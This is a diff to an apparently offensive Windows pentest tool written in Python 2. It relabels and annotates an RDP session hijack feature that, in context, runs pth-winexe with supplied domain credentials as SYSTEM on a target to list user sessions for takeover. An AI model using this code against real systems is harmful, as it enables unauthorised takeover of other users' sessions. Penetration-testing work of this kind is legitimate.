@@ -1926,6 +1926,7 @@ elif remotetargets[0:6]=='range=':
 	for remotetarget in IPNetwork(remotetargets[6:len(remotetargets)]):
 		targets.append (remotetarget);
 
+#Function enables connecting to remote RDP sessions without authenticating as the user who the session belongs to.
 if rdp_connect in yesanswers or "ID" in rdp_connect:
 	
 	rdp_sessions = []
@@ -1933,7 +1934,9 @@ if rdp_connect in yesanswers or "ID" in rdp_connect:
 	if "ID" in rdp_connect:
 		if len(targets)==1:
 			try:
-				print colored("[+]RDP Session Hijack:\n",'green')
+				print colored("[+]RDP Session Hijack:",'green')
+				print colored("[+]Note - RDP Session Hijack can be run with -uRP ID or -uRP y:",'yellow')
+				print colored("[+]-uRP y is more stable:\n",'yellow')
 				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C query user \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				sessions = proc.communicate()[0]
 				print sessions
@@ -1962,8 +1965,8 @@ if rdp_connect in yesanswers or "ID" in rdp_connect:
 	else:
 		if len(targets)==1:
 			try:			
-				print colored("[+]RDP Session Switcher:\n",'green')
-							
+				print colored("[+]RDP Session Hijack:",'green')
+				print colored("[+]Note - RDP Session Hijack can be run with -uRP ID or -uRP y:\n",'yellow')			
 				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C query user \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				sessions = proc.communicate()[0]
 				print sessions
